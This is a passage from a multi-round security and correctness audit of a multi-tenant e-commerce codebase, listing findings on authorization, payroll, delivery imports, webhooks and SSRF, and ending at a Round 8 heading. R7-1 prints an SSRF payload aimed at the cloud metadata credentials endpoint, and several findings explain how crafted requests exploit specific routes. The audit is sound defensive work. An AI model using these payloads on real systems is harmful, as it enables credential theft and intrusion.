   (P0-1). Anyone who is `admin` *anywhere* is `admin` *everywhere* for this bucket.

**Fix.** Add a tenant-prefix predicate on the object path, exactly as `tenant-assets` and `chat-attachments` already do:
`(storage.foldername(name))[1] IN (SELECT get_user_tenant_ids()::text)`, and resolve the role from `tenant_members`.

---

## R4-2 · Coupon codes have no redemption limit and no per-customer limit — P1, revenue

`packages/shared/src/discount.ts` is otherwise well-built (see strengths below), but its header states the gap plainly:

```
// Redemption caps / per-customer limits need DB state and come later.
```

**Verified: "later" has not arrived.** A grep for `usage_limit|usage_count|times_used|per_customer|max_redemptions|
redemption_limit` across `apps/storefront` and `packages/shared` returns **nothing**. There is no counter, no cap, and no
per-phone restriction anywhere in the checkout path.

**Impact, specific to this market.** A single promo code is infinitely reusable by the same customer and by everyone they
forward it to. Iraqi promo codes get screenshotted into Telegram and Instagram groups within hours of being posted. A
merchant running a 30%-off launch code has no ceiling on the damage — and because COD means the discount is realised at
delivery, they find out from the reconciliation, not the checkout.

`min_subtotal_iqd` and `max_discount_iqd` exist and work, so the per-order exposure is bounded; the *aggregate* exposure
is not.

**Fix.** A `discount_redemptions(tenant_id, code, phone, order_id, created_at)` table with a unique constraint for
single-use-per-customer codes, plus a `usage_limit` counter checked inside the same transaction as order creation. The
engine is pure and well-tested, so this is additive.

---

## R4-3 · Fourteen admin routes have no in-route authorization — P1

**Correction first:** Round 3 described the admin app as "1 page, largely unexamined." That was wrong — it counted
`page.tsx` files on a client-routed SPA. The admin app is **284 files and 57 API routes.**

**The good news.** `apps/admin/middleware.ts` properly gates `/api/*`: unauthenticated → `401 JSON`, then a lookup
against the dedicated `admin_users` table checking `is_active` and membership of `{super_admin, support_staff}`, non-admin
→ `403`. Findings B-09 and B-10 from 2026-05 are **closed, and closed well.** `impersonate` in particular is now
exemplary: `requireAdminPermission(request, "impersonate")`, Zod-validated body, and `admin_activity_logs` recording the
**real** admin id.

**The finding.** 43 of 57 routes call the auth helpers. **14 do not**, and rely on the middleware as their only gate:

```
billing/topup                       merchants/[id]/pause
merchants/[id]/extend-subscription  merchants/[id]/unpause
merchants/[id]/extend-trial         merchants/[id]/convert-trial
merchants/[id]/tags                 merchants/[id]/notes
merchants/[id]/audit-log            merchants/[id]/orders
admin/watchlist/[tenantId]          dashboard/stats
auth/callback (public by design)    health (public by design)
```

Two real consequences:

1. **No permission granularity.** The middleware only asks "is this an active admin?" — so a **`support_staff` user can
   call `billing/topup`** and mint arbitrary wallet credit for any tenant (`amount: z.number().positive()`, no ceiling),
   extend or convert any merchant's subscription, and pause/unpause any merchant. `impersonate` demonstrates the correct
   pattern — a named permission — and these 14 skip it.
2. **Single-layer defence on the money path.** If the matcher regex is edited, a route is added outside it, or a rewrite
   bypasses middleware, `billing/topup` becomes publicly callable. Note this is the *same* defect that PR #88 fixed on the
   `topUpWallet` **server action**; the duplicate **API route** was missed.

None of the 14 write an audit log, so a `support_staff` top-up leaves no trail.

**Fix.** `requireAdminPermission(request, "<permission>")` in each of the 12 non-public routes, plus
`admin_activity_logs` writes on the mutating ones.

---

## R4-4 · Loyalty points are debited before the order exists, with a hand-rolled compensating refund — P2

`apps/storefront/app/actions/checkout.ts:300` calls `adjust_customer_points(_delta: -points)` **before** order creation,
then at `:356` refunds them if creation fails:

```ts
// Refund any points deducted for a redemption — the order didn't go through.
if (pointsUsed > 0) { await supabase.rpc("adjust_customer_points", { _delta: pointsUsed, _reason: "redeem_refund" }) }
```

The compensating path is deliberate and well-commented, which is better than most code. But it is not atomic: a crash,
timeout, or serverless cold-kill between the debit and the refund loses the customer's points permanently, with no
reconciliation job to detect the orphan.

Low frequency, high annoyance — a customer loses points and the merchant has no way to see it happened.

**Fix.** Move the redemption inside `create_order_atomic` so the debit and the order commit or roll back together. Failing
that, a nightly job reconciling `customer_points_ledger` `redeem` entries against orders would at least surface orphans.

---

## R4-5 · The two P0 bugs both live in untested modules — P1, process

Test volume is respectable: **2,608 `expect()` calls across 152 files** (~17 per file), and spot-reading
`discount.test.ts` (15 assertions / 8 cases) and `own-echo.test.ts` shows real behavioural assertions, not rubber stamps.
43 files lean on `toBeTruthy`/`toBeDefined`, which is a minor smell, not a crisis.

The problem is **where** the tests are. Critical-path coverage:

| Module | Test? |
|---|---|
| `lib/repositories/order-repository` | ✅ |
| `lib/interakt` | ✅ |
| `hooks/use-order-crud` | ❌ ← **contains P0-3** (conflict retry defeats the check) |
| `lib/idempotency` | ❌ ← **contains P0-2** (guard can never fire) |
| `lib/permissions` | ❌ ← **contains P0-9** (never enforced server-side) |
| `lib/orders/create-order-core` | ❌ |
| `lib/inventory-engine` | ❌ ← relates to P1-8 |
| `lib/webhook-handler` | ❌ |
| `lib/lightfunnels-api` | ❌ |
| `lib/waseet-api` | ❌ ← relates to P1-2 |
| `app/actions/wallet` | ❌ |
| `app/actions/billing` | ❌ |

**10 of the 12 highest-risk modules have no test at all**, and every P0 in this audit that is a *code* bug sits inside one
of them. The testing effort went to the store-builder UI — 30-odd test files — while the order, money and inventory paths
went uncovered.

This is the causal link behind the whole audit: a one-line idempotency bug and an inverted retry survived because nothing
executes those modules except production. Combined with P0-5 (Sentry dead) and tests being absent from CI, there were
three independent chances to catch these and all three were switched off.

**Fix.** A unit test per module above, starting with `idempotency`, `permissions` and `use-order-crud` — each of which
would have failed on the current code. Then put `vitest run` in CI.

---

## Strengths found this round — and two of them are the fix template

Worth reading before the fix campaign, because the codebase already contains the correct version of Round 3's P0s.

### `chat-attachments` storage policies are exactly right

```
chat_attachments_read · SELECT · {authenticated}
  bucket_id = 'chat-attachments'
  AND (storage.foldername(name))[1]::uuid IN (SELECT get_user_tenant_ids())
  AND chat_is_member((storage.foldername(name))[2]::uuid)
```

Tenant folder **and** per-conversation membership, applied identically to SELECT, INSERT and DELETE. Private bucket,
60-second signed URLs. **This is the model for P0-7 (`vault_backups`), P0-8 (`product-images`) and R4-1
(`payroll-pdfs`).** `tenant-assets` DELETE is also correctly folder-scoped.

The pattern is instructive: the newest subsystem has correct storage ACLs and the oldest buckets have none. The knowledge
is in the repo; it was never backported.

### The link-unfurl route is a genuinely good piece of security engineering

`app/api/chat/unfurl/route.ts` layers auth → scheme allowlist → DNS resolution with private/loopback/link-local/
unique-local/IPv4-mapped/6to4/NAT64 rejection → manual redirect handling with re-validation per hop → timeout and byte
caps. And it **documents its own residual risk** rather than hiding it: the validated IP is not pinned for the fetch, so a
low-TTL resolver could rebind between check and connect. Named, bounded, and scheduled as a fast-follow.

That comment is the single best artefact in the codebase. The residual TOCTOU is a real P2 — fix via an undici agent
whose `connect.lookup` re-checks at connection time — but the engineering standard here is the one the rest of the repo
should be held to.

### Discount and loyalty math are correct

`computeDiscount` clamps to `(0, subtotal]`, bounds percent to 0–100, applies `max_discount_iqd`, honours
`min_subtotal_iqd`, and **fails closed on a malformed `ends_iso`** with the reasoning recorded inline ("a malformed end
must not leave a code valid forever (EC21 lesson)"). That is a bug that was found once and then encoded as a guard.

`resolveRedemption` is equally careful: floors the request against the balance, enforces `minRedeemPoints`, caps the
discount at `maxRedeemPct` of subtotal, and — the subtle part — when the cap bites it **only spends the points the granted
discount actually buys** rather than burning the full request. That is the kind of detail that is usually wrong.

### Admin authorization core is solid

`admin_users` + `is_active` + role allowlist in middleware; `requireAdminPermission` with named permissions;
`impersonate` logging the real actor. The architecture is right — R4-3 is 14 routes that did not adopt it, not a missing
design.

---

## Corrections to my own earlier statements

- **Round 3 said the admin app was "1 page, largely unexamined."** Wrong — 57 API routes, 284 files. It is a
  client-routed SPA, so `page.tsx` count told me nothing.
- **Round 2 implied admin routes might be unauthenticated** (carrying forward 2026-05's B-01). They are not: the
  middleware gates `/api/*` with a real `admin_users` check. The accurate finding is *authenticated-but-unauthorized*
  (R4-3), which is narrower and different.
- 2026-05 **B-09** (middleware checks login but not role) and **B-10** (impersonate skips `requireAdmin`) are both
  **closed**.

---

## Running register after 4 rounds

**P0 — 9 findings.** Unchanged from Round 3. Two of them (`vault_backups`, `product-images`) remain single-statement
policy fixes and are still the best severity-to-effort ratio available.

**P1 — 17 findings.** Added this round: R4-1 (payroll PDFs cross-tenant), R4-2 (no coupon caps), R4-3 (14 admin routes
without permission checks, `support_staff` can mint credit), R4-5 (critical-path modules untested).

**P2 — added:** R4-4 (non-atomic loyalty debit), unfurl DNS-rebinding TOCTOU (self-documented).

## Still not audited

- LightFunnels sync field mapping and partial-failure behaviour
- Delivery-import matching algorithm accuracy (false-positive merge risk)
- Notification pipeline correctness — the current branch's live work
- Payroll and commission calculation math (only the *storage* of payslips was checked)
- Bundle size / Core Web Vitals measurement
- Visual contrast, hit-target and colour-only-signalling pass on the main surfaces
- Storefront abandoned-cart recovery correctness
- Bundle-pricing (`packages/shared/src/bundle.ts`) math

---

# Round 5 — payroll, commission and bundle math

Read-only. No code, no migration, no DML.

**Payroll is the most defect-dense subsystem found in five rounds.** Six findings, one of which belongs in the P0 register.

---

## R5-1 · Employees can pay themselves — P0

Three facts combine into this.

**1. Payroll is computed in the browser.** `hooks/use-salaries.ts:546`:

```ts
const grossSalary = effectiveRate.baseMonthlySalary + orderBonus + performanceBonusesTotal;
const netSalary  = Math.max(0, grossSalary - absenceDeduction - advancesTotal - penaltiesTotal);
```

**2. It is written from the browser.** Every payroll write is a direct client Supabase call — no server route, no RPC:
`use-salaries.ts:248,259,302`, `use-payroll.ts:17,46,140,181,198`, `salaries-tab.tsx:368`.

**3. RLS on every payroll table is tenant-membership only — no role predicate.** Verified live:

| Table | SELECT / INSERT / UPDATE / DELETE |
|---|---|
| `payroll_records` | `tenant_id IN get_user_tenant_ids()` |
| `employee_salary_configs` | `tenant_id IN get_user_tenant_ids()` |
| `salary_advances` | `tenant_id IN get_user_tenant_ids()` |
| `salary_penalties` | `tenant_id IN get_user_tenant_ids()` |
| `performance_bonuses` | `tenant_id IN get_user_tenant_ids()` |

Combined with P0-9 (RBAC exists only in the browser), **any tenant member — an `employee`, a `viewer` — can**:

- `UPDATE employee_salary_configs` to raise their own base salary
- `DELETE` their own `salary_penalties` and `salary_advances`
- `INSERT performance_bonuses` for themselves
- `INSERT payroll_records` with any `net_salary` they choose

No server-side check exists at any layer. The UI hides the salaries tab from non-admins; the database does not.

**Fix.** Payroll must move behind a server RPC (`compute_payroll(period)`) that derives every figure from DB state and is
granted to tenant admins only, with role-aware RLS on all five tables. The client should display, never compute.

---

## R5-2 · Over-deduction is silently forgiven — P1, accounting

```ts
const netSalary = Math.max(0, grossSalary - absenceDeduction - advancesTotal - penaltiesTotal);
```

When advances plus penalties exceed gross pay, net floors at zero and **the excess is discarded** — not carried forward,
not recorded as a balance owed. An employee who takes an advance larger than one month's salary has the remainder written
off by a `Math.max`.

**Fix.** Carry the shortfall as an outstanding balance on the advance record and settle it against the next period.
Advances need a partial-repayment model rather than all-or-nothing deduction in a single period.

---

## R5-3 · Absence deduction is derived from telemetry, not attendance — P1, wages

```ts
const activeDays = new Set(empLogs.map(l => l.created_at.split("T")[0]));
const absenceDays = Math.max(0, workingDaysInPeriod - activeDays.size);
const absenceDeduction = Math.round(absenceDays * dailyRate);
```

"Attendance" is **unique days on which the employee happened to write an `activity_logs` row.** Pay is therefore docked
based on whether their actions were instrumented, not whether they came to work.

Anyone whose role generates few logged actions — a packer, a driver, someone on the phone all day — is docked a day's pay
for each day the logger did not fire. And `activity_logs` is not a reliable witness: it already has orphaned rows, and
logging coverage across the app has never been measured.

This is precisely the trap already recorded in the project's own notes — *check the outcome, not the telemetry*. Here the
telemetry **is** the outcome, and it decides someone's wage.

**Fix.** An explicit attendance record (check-in, or an admin-marked day), with activity logs as corroboration at most.
Until then, absence deduction should be advisory and require confirmation rather than auto-applying.

---

## R5-4 · Attendance day-bucketing is UTC — P1, wages

Same line: `l.created_at.split("T")[0]` buckets by **UTC** day, on a UTC+3 market. A shift running 21:00–02:00 Baghdad
spans two UTC dates and counts as two active days; work starting after 21:00 is credited to the following day.

This is the P1-4 class again, but here the wrong day directly changes a wage. Same fix: one canonical `baghdadDay()`.

---

## R5-5 · `WORKING_DAYS_PER_MONTH = 26` is hardcoded and does not match Iraq — P2

`use-salaries.ts:173`. The daily rate is `baseMonthlySalary / 26`.

Iraq's weekend is Friday–Saturday, so a typical month has ~21–22 working days, not 26. The divisor is also not
per-tenant configurable and takes no account of Eid, Arbaeen or public holidays.

Note the numerator and denominator come from different sources: `absenceDays` is derived from `workingDaysInPeriod`
(computed per period) while the daily rate divides by the fixed 26. If those two disagree — which they will in most
months — the deduction is proportionally wrong. **This one needs verification against `workingDaysInPeriod`'s definition
before sizing; flagging the mismatch, not asserting its magnitude.**

---

## R5-6 · Bundle percentages are unclamped — a typo gives the bundle away — P1, revenue

`packages/shared/src/bundle.ts`:

```ts
const raw = b.kind === "percent" ? Math.round(subtotal * (b.value / 100)) : Math.round(b.value);
const amount = Math.min(Math.max(0, raw), subtotal);
```

`b.value` is **never bounded to 0–100.** A bundle configured at `500` percent computes `subtotal × 5`, which
`Math.min(raw, subtotal)` then clamps to the full subtotal — so the failure mode of a typo is **a 100% discount**, not an
error.

Confirmed there is no guard upstream either: `Bundle.value` is a bare `number` in
`types/store-config-v2.ts:422`, there is no `max(100)` anywhere in `packages/shared`, and the editor input at
`bundles-screen.tsx:157` is `Number(e.target.value) || 0` — raw and unbounded.

**The sibling engine gets this right.** `computeDiscount` does `Math.max(0, Math.min(100, d.value))`. Two engines written
to the same brief; one clamps, one does not.

**Fix.** Clamp in `computeBundleDiscounts`, bound it in the Zod schema, and clamp the editor input. All three, since any
one of them can be bypassed by an imported or hand-edited config.

Separately, worth a product decision rather than a fix: a bundle applies when every listed product is in the cart, but the
discount is taken on the **full line subtotal including quantity**. "Buy one of each, get 10% off" therefore also means
10% off all ten units of one of them. That may be intended — it should be stated.

---

## Also noted

- **Bundle scheduling does not exist.** `Bundle` has only `enabled`, no `starts_iso`/`ends_iso`, while `DiscountCode`
  has both. Merchants cannot schedule a bundle promotion. Feature gap, not a defect — no field is being silently ignored.
- **Bundle application is order-dependent.** The first matching bundle in config order consumes its products; a later,
  better bundle for the customer never applies. Deterministic, but arbitrary from the shopper's point of view.
- **`advancesTotal` deducts all pending advances in full**, in one period, with no cap relative to salary — the direct
  cause of R5-2.

---

# Round 6 — delivery import, LightFunnels sync, commissions, notification pipeline

Read-only. No code, no migration, no DML.

**This round found the most exploitable write path in the audit**, and the root cause of a data defect logged in Round 2.

---

## R6-1 · `delivery-import/confirm` lets any logged-in user mark any order delivered at any price — P0

The single worst *write* finding, as `vault_backups` was the worst *read* finding.

**Evidence.** `app/api/delivery-import/confirm/route.ts`:

- **Auth:** `verifyAccessToken` only — any valid login, from any tenant.
- **Input:** entirely client-supplied. `const body = (await request.json()) as ConfirmRequest` — a bare cast, no Zod,
  no server-side re-matching. `confirmedItems[].orderId` and `confirmedItems[].pdfAmount` come straight from the caller.
- **Write**, at `:183`:

```ts
const { error: updateError } = await supabaseAdmin
    .from("orders")
    .update(orderUpdate)
    .eq("id", item.orderId);        // ← no tenant predicate, service role, RLS bypassed
```

- **What `orderUpdate` contains**: `status` set to `delivered` / `refund_delivered` / `refund_failed`, and at `:150`
  **`orderUpdate.price = item.pdfAmount`** — an arbitrary client value.

**Impact.** A crafted POST sets *any order in the database* to `delivered` at *any price*. That is cross-tenant revenue
manipulation and fraudulent delivery confirmation in one request, with no server-side validation that a courier PDF was
ever parsed. In a COD business, "delivered at price X" is the settlement record.

**Root cause found for DATA-01.** The `delivery_imports` insert at `:69` records `receipt_number`, `payment_date`,
`receiving_agent`, `imported_by`, `confirmed_by` — **and no `tenant_id`**. That is exactly why 8 of 17 `delivery_imports`
rows (47%) have a NULL `tenant_id` and are invisible to every tenant. The audit table for this operation cannot say which
merchant performed it.

**Fix.** `resolveCallerTenant()`, Zod on the body, re-run the match server-side rather than trusting `confirmedItems`,
add `.eq("tenant_id", callerTenantId)` to the update, and set `tenant_id` on the import record.

---

## R6-2 · `delivery-import/match` reads every tenant's orders and matches across tenants — P0

`app/api/delivery-import/match/route.ts` feeds the route above.

```ts
supabaseAdmin.from("orders").select("*").in("order_id", snArr).eq("is_archived", false)
supabaseAdmin.from("orders").select("*").in("phone",   phArr).eq("is_archived", false)
supabaseAdmin.from("orders").select("*").eq("is_archived", false).eq("is_return", true)
```

Three problems:

1. **No tenant filter on any of the three.** Service role, so RLS does not save it.
2. **The third query is unbounded** — it pulls **every non-archived return order in the entire database**, `select("*")`,
   no limit, on every match request.
3. **Phone is the join key, and it is normalised to four variants** (`0…`, `964…`, `+964…`, raw) from the last ten
   digits. Iraqi customers shop at multiple merchants, so cross-tenant phone collisions are not a corner case — they are
   the expected case. A courier PDF uploaded by tenant A will match tenant B's orders, and those matches flow into
   R6-1's write.

Also: the duplicate-import guard queries `delivery_imports` by `receipt_number` with **no tenant filter**, so tenant A's
receipt number blocks tenant B's legitimate import as a false duplicate.

**Fix.** Tenant-scope all three queries, bound the returns query, and scope the receipt-number check.

---

## R6-3 · LightFunnels sync soft-deletes orders across tenants, inside a swallowed catch — P1

`lib/lightfunnels-api.ts:818–843`, running as **service role** (`createSupabaseServiceClient`, line 8):

```ts
const { data: phoneMatches } = await supabase
    .from('orders')
    .select('id, order_id')
    .eq('status', 'pending_checkout')
    .eq('phone', formattedPhone)
    .eq('source', 'lightfunnels')
    .gte('created_at', windowStart)      // order time − 24h
    .lte('created_at', windowEnd);

if (phoneMatches && phoneMatches.length > 0) {
    await supabase.from('orders').update({ deleted_at: ... }).in('id', phoneMatches.map(c => c.id));
}
…
} catch {
    // Non-fatal: order was already created successfully
}
```

**No tenant filter on the select or the soft-delete**, and the entire block is wrapped in an empty `catch {}`.

So if two merchants both use LightFunnels and one customer abandons a checkout at merchant A within 24 hours of ordering
at merchant B, **B's import silently soft-deletes A's pending checkout** — and any error in the process is discarded with
a comment asserting it was non-fatal.

The abandoned-checkout cleanup is a reasonable idea. Matching on phone alone, unscoped, with errors suppressed, is not.

**Fix.** Add the tenant predicate, and let the catch log rather than swallow.

---

## R6-4 · Commission is paid on cancelled and returned orders — P1, money

`apps/admin/app/api/team/commissions/calculate/route.ts:51`:

```ts
const { count: orderCount } = await supabase
  .from("orders")
  .select("id", { count: "exact", head: true })
  .eq("tenant_id", lead.converted_tenant_id)
  .gte("created_at", period_start)
  .lte("created_at", period_end);
```

**No status filter.** Every order *created* in the period counts — cancelled, returned, refunded, `no_response`, and
duplicates included. In a COD market where return-to-origin is the dominant loss, commission is being paid on revenue
that never arrived.

It also buckets on `created_at`, while the payroll subsystem was explicitly corrected to bucket completed orders on
`completed_at`. The two subsystems now disagree about what counts and when.

**Fix.** Count only orders that actually completed, on `completed_at`, excluding returns and refunds — and align the
definition with payroll.

---

## R6-5 · Commission tier selection is fragile — P2

Same file, `:64`:

```ts
for (const tier of tiers) {
  if (orders >= tier.min_orders && (!tier.max_orders || orders <= tier.max_orders)) {
    earned = orders * tier.rate;
    break;
  }
}
```

Four defects in six lines:

1. **Array-order dependent** — tiers are never sorted, and the loop `break`s on the first match. Unsorted or overlapping
   tiers silently pay the wrong rate.
2. **`!tier.max_orders` treats `0` as unbounded.** A tier with `max_orders: 0` matches every order count above its
   minimum. Should be `tier.max_orders == null`.
3. **Gaps pay nothing, silently.** If tiers cover 1–10 and 20–30 and the count is 15, `earned` stays `0`. No fallback,
   no warning.
4. **`rate_per_order ?? 250`** invents a hardcoded 250 IQD rate when config is missing, rather than failing. A
   misconfigured commission pays a made-up number.

Worth stating as a policy question rather than a bug: `earned = orders * tier.rate` applies the tier's rate to **all**
orders, so crossing a tier boundary by one order steps the whole payout up. That may be intended; it should be written
down.

---

## R6-6 · LightFunnels sync window is roughly two days wider than requested — P1

`lib/lightfunnels-api.ts:1100`:

```ts
realQuery = realQuery.lte('created_at',
  new Date(new Date(dateTo + 'T23:59:59.999').getTime() + 24 * 60 * 60 * 1000).toISOString());
```

`dateTo + 'T23:59:59.999'` has **no timezone suffix**, so it parses in the server's local zone, then a **further 24
hours** is added on top of an already end-of-day bound. The effective upper bound is ~2 days past the requested date, and
it shifts with the host's timezone.

Related, at `:521` and `:560`: the default end is built from `toISOString().split('T')[0]` — the MONEY-12 UTC class again.

Consequence: syncs pull orders outside the requested range, which makes reconciliation between LightFunnels and the
platform non-deterministic.

---

## R6-7 · Notification delivery metrics appear unwired — P1, needs verification first

Live counts:

| Table | Rows |
|---|---|
| `notifications` | 474 total · **472 in the last 7 days** · 10 in the last 24h · latest 2026-09-16 21:59 |
| `notification_deliveries` | **3** — all `channel=push`, all `status=pruned`, latest 2026-09-12 |

Notifications are clearly being created. The delivery-tracking table added by
`20260912110000_notification_delivery_metrics.sql` has essentially nothing in it, four days on.

**Deliberately not asserting a bug.** Per this project's own hard-won lesson — *an empty log table means the logging
moved at least as often as the feature died* — the correct next step is to check what the feature **changes**: did the
472 notifications actually reach a device or a digest? Three candidate explanations: (a) the writer was never wired to
the send paths, (b) `prune_notification_deliveries(30)` is deleting rows faster than expected, (c) sends are failing
before the delivery row is written. This is live work on the current branch, so incomplete wiring is the most likely and
least alarming answer.

**Action:** verify delivery outcomes directly before changing anything. If (a), the notification overhaul currently has
no observability — which is the same hole as OPS-01, in a subsystem being actively built.

---

## Verified OK this round

- **Abandoned-cart recovery is well built.** `cron/abandoned-cart-recovery` loads each tenant's config once, honours a
  per-tenant opt-in (`enabled`) and per-tenant `delay_minutes`, enforces a global minimum-age floor, and stamps
  `reminded_at` for idempotency. Correctly tenant-aware throughout — the opposite of R6-3.
- **`team/commissions/calculate` is auth-gated** (not among the 14 in SEC-08). The defects are in its arithmetic, not its
  access control.
- **Commission upsert is correctly keyed** on `(admin_user_id, tenant_id, period_start, period_end)`, so recalculation
  updates rather than duplicates.

## Noted, not measured

`webpack-bundle-analyzer` is installed and wired opt-in behind a flag in `next.config.ts:87`, and
`@vercel/speed-insights` is a dependency — so field CWV data may already exist in Vercel. There is **no budget and no
CI gate**, and this audit did not run either measurement. Bundle size and Core Web Vitals remain genuinely unmeasured.

---

# Round 7 — webhooks, PDF generation, soft deletes, chat search, QC

Read-only. No code, no migration, no DML.

Two new P0s, both at untrusted-input boundaries. Also the round with the sharpest internal contrast: the same repo
contains a six-layer SSRF defence and a completely unguarded SSRF primitive.

---

## R7-1 · `generate-batch-pdf` renders attacker-supplied HTML in server-side Chrome — P0, SSRF

**Evidence.** `app/api/generate-batch-pdf/route.ts`:

```ts
const { html, pageWidth = '80mm', pageHeight = '120mm' } = await req.json();
if (!html) return 400;
…
await page.setContent(html, { waitUntil: ['networkidle0', 'load', 'domcontentloaded'] });
…
const pdf = await page.pdf({ … });   // returned to the caller
```

Auth is `verifyAccessToken` — any logged-in user. There is **no sanitization, no request interception, no URL
allowlist**, and `waitUntil: 'networkidle0'` explicitly waits for every resource the HTML references to load.

**Impact.** This is a full SSRF primitive *with output exfiltration*. An attacker POSTs:

```html
<img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/...">
<iframe src="http://internal-service.local/admin" width="1200" height="2000"></iframe>
```

The server's headless Chrome fetches those, renders them, and hands back a PDF the attacker downloads. Blind SSRF becomes
visible SSRF. Depending on the Chromium build's flags, `file://` reads are also plausible.

**The contrast is the point.** `app/api/chat/unfurl/route.ts` implements six mandatory layers — scheme allowlist, DNS
resolution with private/loopback/link-local/unique-local/IPv4-mapped/6to4/NAT64 rejection, manual redirect handling with
per-hop re-validation, byte and time caps — to protect a *much weaker* primitive (fetching one URL and parsing its
`<title>`). This route, which renders arbitrary markup in a real browser, has none of it.

**Fix.** Do not accept HTML from the client. Pass order IDs, resolve them server-side with tenant scoping, and render
from a server-owned template. If client HTML must stay, add `page.setRequestInterception(true)` and abort every request
whose URL is not on an allowlist (your own asset domains), and set `waitUntil: 'domcontentloaded'`.

---

## R7-2 · `/api/webhooks/lightfunnels` accepts unauthenticated POSTs by design — P0

**Evidence.** The route documents its own posture:

```ts
// 1. Verify webhook secret — lenient to match OLD project's behavior.
// … Reject only when the request DOES send a secret and it doesn't match …
// Accept anonymous POSTs with a warning log …
// TODO: switch back to strict once Lightfunnels supports custom headers
//       OR we move to HMAC-of-body signing.
const expectedSecret = env.LIGHTFUNNELS_WEBHOOK_SECRET;
const secret = request.headers.get("x-webhook-secret");
if (expectedSecret && secret && secret !== expectedSecret) return 401;
if (!secret && expectedSecret) {
    console.warn("[Webhook] No x-webhook-secret header — accepting anyway (parallel-run leniency)");
}
```

Omit the header entirely and the request is accepted. **Anyone on the internet can inject orders.**

**Why it matters more than it looks.** Tenant attribution is `env.LIGHTFUNNELS_TENANT_ID` — a single fixed tenant, which
per DATA-05 is **the one real production merchant**. So injected orders land in the live order book and then:

- `createOrderFromWebhook` creates a real order, reserving inventory at confirmation
- `sendNewOrderAlertToStaff` fires real WhatsApp/notification spend
- duplicate detection, aggregates, commission counts and payroll order counts all absorb the fake rows

This is F-16 from the 2026-05 report. The reason for the leniency (OLD→NEW parallel run) is at least honestly documented,
which is more than most such holes get — but the parallel run is precisely what the WhatsApp cutover runbook exists to end.

**Fix.** HMAC-of-body signing, which the TODO already identifies as the right answer, or a shared-secret query parameter
on the webhook URL registered in LightFunnels. Either closes it without waiting for LightFunnels to support custom headers.

---

## R7-3 · The Telegram webhook secret check fails open — P1

```ts
export async function POST(req: NextRequest) {
    const expected = process.env.TELEGRAM_WEBHOOK_SECRET;
    if (expected) {                                    // ← unset ⇒ no check at all
        const got = req.headers.get("x-telegram-bot-api-secret-token");
        if (got !== expected) return 403;
    }
```

If `TELEGRAM_WEBHOOK_SECRET` is unset, every check is skipped. This route reaches `createOrderCore` (`:293`) and creates
real orders.

This is exactly the pattern `lib/cron-auth.ts` was written to eliminate, with a rationale that applies verbatim here:
*"this project has previously lost environment variables in production without anyone noticing — so 'unset' is a real
state, not a hypothetical one."* The fix template is in the repo; this route predates or missed it.

**Credit where due:** the rest of this route is well built. Tenant is resolved from `telegram_employee_link → link.tenant_id`
and threaded through `getActivePending`, `loadProducts` and `createOrderCore` — properly scoped throughout, with a comment
noting that a delinked user "can't drive orders into a tenant they no longer belong to."

---

## R7-4 · The LightFunnels webhook logs full customer payloads unconditionally — P1, PII

```
// DIAGNOSTIC LOGGING - Always log to debug order import issues
console.log("=========== WEBHOOK RECEIVED ===========");
```

13 `console.log` calls dump payload keys, node contents and order details on every webhook. The LightFunnels payload
carries customer name, phone, shipping address and line items, so **customer PII is written to Vercel logs on every
order**, permanently, with no redaction and no retention control.

Combined with OPS-04 (463 `console.log`, no structured logger), the log stream is both the only observability you have
(OPS-01) and a PII store. Those two facts pull in opposite directions and need resolving together.

---

## R7-5 · Soft deletes are not enforced anywhere — P1, correctness

`orders.deleted_at` implements soft deletion — `orders/delete` sets it rather than removing the row.

**Nothing enforces it.**

- RLS on `orders` has **no `deleted_at IS NULL` predicate** — all four policies are plain tenant checks.
- Of **158** code sites querying `orders`, only **8** mention `deleted_at`.

Live impact: **41 soft-deleted orders, all in the real production tenant**, remain visible to roughly 150 query paths —
reports, exports, analytics, the dashboard, payroll order counts and commission counts (which per MONEY-15 already have no
status filter either).

So a merchant "deletes" an order and it keeps contributing to revenue figures, employee bonuses and commission payouts.

**Fix.** Either a `deleted_at IS NULL` predicate in the RLS `SELECT` policy — one change, global effect, and it cannot be
forgotten by the next query — or an `orders_active` view that every read path uses. The RLS route is preferable given
PERF-01 (89% client components, so most queries are written ad hoc in hooks).

---

## Verified OK this round

### `chat_search_messages` is exemplary — and it is SEC-11's fix template

```sql
CREATE INDEX … ON chat_messages USING gin (to_tsvector('simple', body));

CREATE OR REPLACE FUNCTION public.chat_search_messages(p_query text, p_limit int DEFAULT 30)
… LANGUAGE plpgsql SECURITY DEFINER STABLE SET search_path = public, pg_temp AS $$
  v_q := websearch_to_tsquery('simple', p_query);
  …
  AND m.conversation_id IN (SELECT cm.conversation_id FROM chat_members cm WHERE cm.user_id = auth.uid())
  ORDER BY ts_rank(…) LIMIT least(coalesce(p_limit, 30), 50);
$$;

REVOKE EXECUTE ON FUNCTION public.chat_search_messages(text, int) FROM PUBLIC, anon;
GRANT  EXECUTE ON FUNCTION public.chat_search_messages(text, int) TO authenticated;
```

Every box ticked: a GIN index the query actually matches, `websearch_to_tsquery` rather than string concatenation, an
`auth.uid()` membership predicate inside the definer function, `SET search_path` (so it is not among SEC-18's 26),
a hard `LIMIT least(…, 50)` cap, and — critically — **`REVOKE … FROM PUBLIC, anon` then an explicit narrow `GRANT`.**

That last line is the exact pattern SEC-11 says is missing from 69 other definer functions, and it matches the project's
own recorded lesson that revoking from `anon` alone is a no-op when the grant came via `PUBLIC`. **The correct migration
idiom already exists in this repo.**

### Also clean

- **Telegram tenant scoping** — resolved from `telegram_employee_link`, threaded through every downstream call.
- **QC quarantine and printing RLS** — `qc_quarantine`, `qc_quarantine_events`, `print_batches`, `print_history` all
  correctly scoped with `tenant_id IN get_user_tenant_ids()`.
- **`generate-batch-pdf` leaks no tenant data** — it never queries orders; it renders caller-supplied HTML. The defect is
  R7-1, not a scoping one.
- **Interakt webhooks verify a secret** — the global route at `:295` calls it "mandatory", and the per-tenant route checks
  `integration.credentials.webhook_secret`.

---

## Pattern across seven rounds

Every subsystem built for the chat feature — storage ACLs, search, SSRF defence, `REVOKE FROM PUBLIC`, fail-closed cron
auth — is correct, and in several cases exemplary. Every one of those correct patterns has an equivalent elsewhere in the
codebase that was never brought up to the same standard: `chat-attachments` vs `vault_backups`, `unfurl` vs
`generate-batch-pdf`, `chat_search_messages`'s REVOKE vs 69 open definer functions, `requireCronAuth` vs the Telegram
webhook's fail-open check.

**The fixes in this audit are overwhelmingly not research problems. They are backporting a pattern the repo already
proved it knows how to write.**

---

# Round 8 — foundations: the RLS linchpin, realtime, headers, injection surface, secret flow

